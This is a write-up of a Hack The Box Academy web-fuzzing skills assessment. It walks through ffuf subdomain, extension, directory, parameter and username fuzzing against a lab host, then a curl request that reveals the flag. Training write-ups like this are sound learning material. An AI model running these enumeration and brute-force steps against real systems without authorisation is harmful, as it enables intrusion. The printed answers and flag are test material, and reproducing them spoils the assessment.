# Skills Assessment - Web Fuzzing

You are given an online academy's IP address but have no further information about their website. As the first step of conducting a Penetration Test, you are expected to locate all pages and domains linked to their IP to enumerate the IP and domains properly.

Finally, you should do some fuzzing on pages you identify to see if any of them has any parameters that can be interacted with. If you do find active parameters, see if you can retrieve any data from them.

## Walkthrough

### Run a sub-domain/vhost fuzzing scan on '\*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)

```bash
sudo nano /etc/hosts
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://94.237.55.163:47406/ -H 'Host: FUZZ.academy.htb' -fs 985
#test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2457ms]
#archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
#faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 209ms]
```

### Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:47406/indexFUZZ
#.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 201ms]
#.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
#.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1923ms]
```

### One of the pages you will identify should say 'You don't have access!'. What is the full page URL?

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:47406/FUZZ -recursion -recursion-depth 1 -e .php,.php7,.phps -t 80 -fs 287
#courses
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:47406/courses/FUZZ -recursion -recursion-depth 1 -e .php,.php7,.phps -t 80 -fs 287
#linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 208ms]
http://faculty.academy.htb:47406/courses/linux-security.php7
```

### In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://faculty.academy.htb:47406/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774
#user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 200ms]
#username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 208ms]
```

### Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://faculty.academy.htb:47406/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781
#harry
curl http://faculty.academy.htb:47406/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
HTB{w3b_fuzz1n6_m4573r}
```
